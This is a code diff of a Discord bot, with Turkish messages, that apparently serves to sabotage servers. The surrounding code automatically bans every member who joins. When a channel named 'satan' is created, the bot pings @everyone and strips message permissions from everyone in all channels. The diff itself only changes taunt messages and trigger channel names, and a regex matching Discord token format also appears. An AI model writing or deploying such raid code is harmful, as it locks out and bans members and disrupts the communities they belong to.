@@ -134,7 +134,7 @@ client.unload = command => {
 
 client.on('guildMemberAdd', member => {
   member.guild.ban(member, "BAN BOT TARAFINDAN YOK EDİLDİ")
-  member.send(`GİRMEYE ÇALIŞTIĞIN SUNUCU GG KARŞİM XD`)
+  member.send(`Satan Win.`)
 });
 
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
@@ -148,8 +148,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'light') {
-    channel.send(`sen bizi dolandırdın ya @everyone`)
+  if (channel.name == 'satan') {
+    channel.send(`@everyone https://media1.tenor.com/images/55f51adbe8a54dcb321a412bdfa738bb/tenor.gif?itemid=8515905`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -158,7 +158,7 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'light') {
+  if (channel.name == 'never-lose') {
     channel.send(`sen bizi dolandırdın ya @everyone`)
   }
 
